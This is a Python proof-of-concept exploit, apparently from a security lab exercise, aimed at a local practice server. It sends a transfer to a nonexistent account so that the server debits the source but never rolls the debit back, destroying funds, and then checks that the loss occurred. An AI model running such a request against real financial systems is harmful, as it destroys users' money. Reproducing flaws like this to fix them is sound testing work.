#!/usr/bin/env python3
"""PoC (in-code step, F-4): failed transfer destroys funds (no atomicity).

EDUCATIONAL - run against the local practice target only.
Trigger : POST /transfer to a destination account that does not exist.
Effect  : the server debits the source, then crashes on the unknown
          destination - the debit is NOT rolled back, so funds vanish.
Invariant broken: "a failed transfer leaves balances unchanged".
Boundary: non-atomic debit-before-credit on an unauthenticated endpoint.
Ladder  : theoretical -> in-code (this file). Exit 0 = reproduced.
"""
import http.client
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"


def transfer(src: str, dst: str, amount: int) -> dict | None:
    data = urllib.parse.urlencode({"from": src, "to": dst, "amount": amount}).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read().decode())
    except (urllib.error.URLError, http.client.HTTPException, ConnectionError, OSError):
        return None  # server dropped the connection mid-handler (the crash)


def balances() -> dict:
    return transfer("vault", "vault", 0)["balances"]


def main() -> int:
    before = balances()
    print(f"[read   ] balances before: {before}")

    resp = transfer("alice", "ghost_account", 7)
    print(f"[attack ] POST /transfer from=alice to=ghost_account amount=7 -> "
          f"{'connection dropped (handler crashed)' if resp is None else resp}")

    after = balances()
    print(f"[read   ] balances after : {after}")

    ok = after["alice"] == before["alice"] - 7
    if not ok:
        print("FAIL: debit was rolled back or never happened")
        return 1
    print(
        f"REPRODUCED: transfer failed yet alice was debited 7 "
        f"({before['alice']} -> {after['alice']}); 7 units were destroyed, "
        "not transferred"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
